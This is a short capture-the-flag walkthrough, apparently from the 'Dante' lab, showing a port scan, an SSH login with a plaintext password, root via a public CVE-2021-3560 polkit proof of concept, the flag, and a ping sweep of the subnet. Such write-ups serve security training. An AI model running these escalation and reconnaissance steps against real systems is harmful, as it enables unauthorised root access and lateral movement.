# 172.16.2.101 - DANTE-ADMIN-NIX05 Pwn3d!

sudo nmap -sCV  172.16.2.101
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2026-08-14 11:45 EDT
Nmap scan report for 172.16.2.101
Host is up (0.0016s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 20:d0:8e:88:ee:db:b4:cf:35:b7:db:cb:74:a0:50:0b (RSA)
|   256 db:33:b7:7b:64:70:46:12:29:02:36:b3:c5:cf:96:3d (ECDSA)
|_  256 66:bb:0d:63:a8:1e:4c:24:fe:2c:7e:9e:3a:03:00:e6 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 9.73 seconds

ssh [julian@172.16.2.101](mailto:julian@172.16.2.101)

julian:manchesterunited

julian@DANTE-ADMIN-NIX05:~$ id
uid=1001(julian) gid=1001(julian) groups=1001(julian)

Vulnerable to CVE-2021-3560

[https://github.com/f4T1H21/CVE-2021-3560-Polkit-DBus](https://github.com/f4T1H21/CVE-2021-3560-Polkit-DBus)

julian@DANTE-ADMIN-NIX05:~/Downloads$ ./poc.sh pepe
[+] Trying to add user ...
[+] Trying to change user password ...
[+] Trying to change user password ...
[+] Trying to change user password ...
[***] Here comes the PoC:
uid=0(root) gid=0(root) groups=0(root)
[+] Removing previously created user

bash-5.0# id
uid=1001(julian) gid=1001(julian) euid=0(root) egid=0(root) groups=0(root),1001(julian)
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# ls
flag.txt  peda	snap
bash-5.0# cat flag.txt
DANTE{0verfl0wing_l1k3_craz33!}

for ip in {1..254}; do ping 172.16.2.$ip -c 1 -w 1 | grep "64 bytes"; done
64 bytes from 172.16.2.5: icmp_seq=1 ttl=128 time=0.558 ms
64 bytes from 172.16.2.6: icmp_seq=1 ttl=64 time=3.23 ms